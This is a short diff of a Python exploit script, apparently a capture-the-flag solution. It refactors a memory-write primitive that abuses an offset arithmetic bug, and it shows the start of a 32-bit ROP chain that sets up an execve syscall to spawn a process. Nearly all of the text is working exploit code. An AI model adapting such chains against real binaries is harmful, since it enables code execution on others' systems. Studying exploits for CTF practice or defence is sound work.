@@ -33,14 +33,13 @@ def r_mem(offset):
 def w_mem(offset, value):
     current = r_mem(offset)
     diff = value - current
-    if diff == 0:
-        return 0
-
-    p.sendline('%+d%+d' % (offset, diff))
-    assert value == int(p.recvline())
+    if diff != 0:
+        p.sendline('%+d%+d' % (offset, diff))
+        assert value == int(p.recvline())
 
 
 p.recvline()
+
 rop = [0x0805c34b,  # pop eax ; ret
        0x0000000b,  # SYS_EXECVE
        0x080701d0,  # pop edx ; pop ecx ; pop ebx ; ret
